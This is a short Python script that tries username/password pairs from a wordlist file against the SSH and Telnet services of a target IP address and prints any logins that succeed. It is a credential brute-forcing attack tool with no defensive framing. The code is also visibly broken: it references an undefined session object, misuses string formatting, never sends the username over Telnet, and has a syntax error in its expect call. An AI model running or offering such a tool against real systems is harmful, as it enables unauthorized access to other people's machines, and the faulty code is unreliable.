import paramiko
import telnetlib

def SSHLogin(host,port,username,password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host,port=port,username=username,password=password);
        if ssh_session.active:
            print("SSH login successful on %S:%S with username %s and passwrod %s") % (host,port,username,password)
    except Exception as e:
        return
    ssh.close()

def TelnetLogin(host,port,username,password):
    user = bytes(username + "\n","utf-8")
    passwd = bytes(password + "\n","utf-8")

    tn = telnetlib.Telnet(host,port)
    tn.read_until(bytes("login: ", "utf-8"))
    tn.write(passwd)
    try:
        result = tn.expect([bytes("Last login","utf-8"), timeout = 2])
        if (result[0] >= 0):
            print("Telnet login successful on %s:%s with username %s and password %s" % (host,port,username, passwd))
        tn.close()
    except EOFError:
        print("Login failed %s %s" % (username,password))

host = input("IP address: ")
with open("{insert the file name here}.txt", "r") as f:
    for line in f:
        vals = line.split()
        username = vals[0].strip()
        password = vals[1].strip()
        SSHLogin(host,22,username,password)
        TelnetLogin(host,23,username,password)

